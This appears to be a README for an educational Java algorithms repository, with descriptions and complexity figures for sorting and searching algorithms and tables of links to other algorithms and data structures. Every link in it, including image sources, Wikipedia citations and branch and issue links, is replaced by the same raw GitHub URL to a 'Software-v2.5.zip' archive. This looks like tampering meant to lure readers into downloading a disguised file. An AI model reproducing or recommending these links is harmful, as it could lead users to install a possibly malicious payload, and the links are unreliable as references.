# The Algorithms - Java

NOTE: A [Development](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip) branch is made for this repo where we are trying to migrate the existing project to a Java project structure. You can switch to [Development](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip) branch for contributions. Please refer [this issue](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip) for more info.

### All algorithms implemented in Java (for education)

These are for demonstration purposes only. There are many implementations of sorts in the Java standard library that are much better for performance reasons.

## Sort Algorithms


### Bubble
![alt text][bubble-image]

From [Wikipedia][bubble-wiki]: Bubble sort, sometimes referred to as sinking sort, is a simple sorting algorithm that repeatedly steps through the list to be sorted, compares each pair of adjacent items and swaps them if they are in the wrong order. The pass through the list is repeated until no swaps are needed, which indicates that the list is sorted.

__Properties__
* Worst case performance    O(n^2)
* Best case performance    O(n)
* Average case performance    O(n^2)

##### View the algorithm in [action][bubble-toptal]



### Insertion
![alt text][insertion-image]

From [Wikipedia][insertion-wiki]: Insertion sort is a simple sorting algorithm that builds the final sorted array (or list) one item at a time. It is much less efficient on large lists than more advanced algorithms such as quicksort, heapsort, or merge sort. 
In the figure, each bar represents an element of an array that needs to be sorted. What happens at the first intersection of the top most and second top most bars is to swap these elements, represented by bars, because the second element has a higher precedence than the first element does. By repeating this method, insertion sort completes sorting.

__Properties__
* Worst case performance    O(n^2)
* Best case performance    O(n)
* Average case performance    O(n^2)

##### View the algorithm in [action][insertion-toptal]


### Merge
![alt text][merge-image]

From [Wikipedia][merge-wiki]: In computer science, merge sort (also commonly spelt mergesort) is an efficient, general-purpose, comparison-based sorting algorithm. Most implementations produce a stable sort, which means that the implementation preserves the input order of equal elements in the sorted output. Mergesort is a divide and conquer algorithm that was invented by John von Neumann in 1945.

__Properties__
* Worst case performance    O(n log n) (typical)
* Best case performance    O(n log n)
* Average case performance    O(n log n)


##### View the algorithm in [action][merge-toptal]

### Quick
![alt text][quick-image]

From [Wikipedia][quick-wiki]: Quicksort (sometimes called partition-exchange sort) is an efficient sorting algorithm, serving as a systematic method for placing the elements of an array in order.

__Properties__
* Worst case performance    O(n^2)
* Best case performance    O(n log n) or O(n) with three-way partition
* Average case performance    O(n log n)

##### View the algorithm in [action][quick-toptal]

### Selection
![alt text][selection-image]

From [Wikipedia][selection-wiki]: The algorithm divides the input list into two parts: the sublist of items already sorted, which is built up from left to right at the front (left) of the list, and the sublist of items remaining to be sorted that occupy the rest of the list. Initially, the sorted sublist is empty and the unsorted sublist is the entire input list. The algorithm proceeds by finding the smallest (or largest, depending on sorting order) element in the unsorted sublist, exchanging (swapping) it with the leftmost unsorted element (putting it in sorted order), and moving the sublist boundaries one element to the right.

__Properties__
* Worst case performance    O(n^2)
* Best case performance    O(n^2)
* Average case performance    O(n^2)

##### View the algorithm in [action][selection-toptal]

### Shell
![alt text][shell-image]

From [Wikipedia][shell-wiki]:  Shellsort is a generalization of insertion sort that allows the exchange of items that are far apart.  The idea is to arrange the list of elements so that, starting anywhere, considering every nth element gives a sorted list.  Such a list is said to be h-sorted.  Equivalently, it can be thought of as h interleaved lists, each individually sorted.

__Properties__
* Worst case performance O(nlog2 2n)
* Best case performance O(n log n)
* Average case performance depends on gap sequence

##### View the algorithm in [action][shell-toptal]

### Time-Complexity Graphs

Comparing the complexity of sorting algorithms (Bubble Sort, Insertion Sort, Selection Sort)

[Complexity Graphs](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)

----------------------------------------------------------------------------------

## Search Algorithms

### Linear
![alt text][linear-image]

From [Wikipedia][linear-wiki]: linear search or sequential search is a method for finding a target value within a list. It sequentially checks each element of the list for the target value until a match is found or until all the elements have been searched.
  The linear search runs in at the worst linear time and makes at most n comparisons, where n is the length of the list.

__Properties__
* Worst case performance    O(n)
* Best case performance    O(1)
* Average case performance    O(n)
* Worst case space complexity    O(1) iterative

### Binary
![alt text][binary-image]

From [Wikipedia][binary-wiki]: Binary search, also known as half-interval search or logarithmic search, is a search algorithm that finds the position of a target value within a sorted array. It compares the target value to the middle element of the array; if they are unequal, the half in which the target cannot lie is eliminated and the search continues on the remaining half until it is successful.

__Properties__
* Worst case performance    O(log n)
* Best case performance    O(1)
* Average case performance    O(log n)
* Worst case space complexity    O(1) 

##### View the algorithm in [action][shell-toptal]

[bubble-toptal]: https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip
[bubble-wiki]: https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip
[bubble-image]: https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip "Bubble Sort"

[insertion-toptal]: https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip
[insertion-wiki]: https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip
[insertion-image]: https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip "Insertion Sort"

[quick-toptal]: https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip
[quick-wiki]: https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip
[quick-image]: https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip "Quick Sort"

[merge-toptal]: https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip
[merge-wiki]: https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip
[merge-image]: https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip "Merge Sort"

[selection-toptal]: https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip
[selection-wiki]: https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip
[selection-image]: https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip "Selection Sort Sort"

[shell-toptal]: https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip
[shell-wiki]: https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip
[shell-image]: https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip "Shell Sort"

[linear-wiki]: https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip
[linear-image]: https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip

[binary-wiki]: https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip
[binary-image]: https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip


--------------------------------------------------------------------
## Links to the rest of the algorithms

Conversions          |                                          Dynamic Programming   |Ciphers|Miscellaneous|
-----------          |----------------------------------------------------------------|-------|-------------|
[Any Base to Any Base](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)| [Coin Change](Dynamic%https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|[Caesar](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|[Heap Sort](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|
[Any Base to Decimal](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|[Egg Dropping](Dynamic%https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|[Columnar Transposition Cipher](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|[Palindromic Prime Checker](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|
[Binary to Decimal](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|[Fibonacci](Dynamic%https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|[RSA](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|More soon...|
[Binary to HexaDecimal](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|[Kadane Algorithm](Dynamic%https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|more coming soon...|
[Binary to Octal](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|[Knapsack](Dynamic%https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|
[Decimal To Any Base](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|[Longest Common Subsequence](Dynamic%https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|
[Decimal To Binary](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|[Longest Increasing Subsequence](Dynamic%https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|
[Decimal To Hexadecimal](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|[Rod Cutting](Dynamic%https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|
and much more...|                                                    and more...|

### Data Structures
Graphs|Heaps|Lists|Queues|
------|-----|-----|------|
[BFS](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|[Empty Heap Exception](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|[Circle Linked List](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|[Generic Array List Queue](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|
[DFS](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|[Heap](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|[Doubly Linked List](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|[Queues](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|
[Graphs](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|[Heap Element](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|[Singly Linked List](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|
[Kruskals Algorithm](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|[Max Heap](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|
[CursorLinkedList](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|
[Matrix Graphs](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|[Min Heap](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|
[PrimMST](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|

Stacks|Trees|
------|-----|
[Node Stack](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|[AVL Tree](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|
[Stack of Linked List](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|[Binary Tree](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|
[Array Stack](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|And much more...|
[ArrayList Stack](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)||

* [Bags](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)
* [Buffer](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)
* [HashMap](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)
* [Matrix](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)
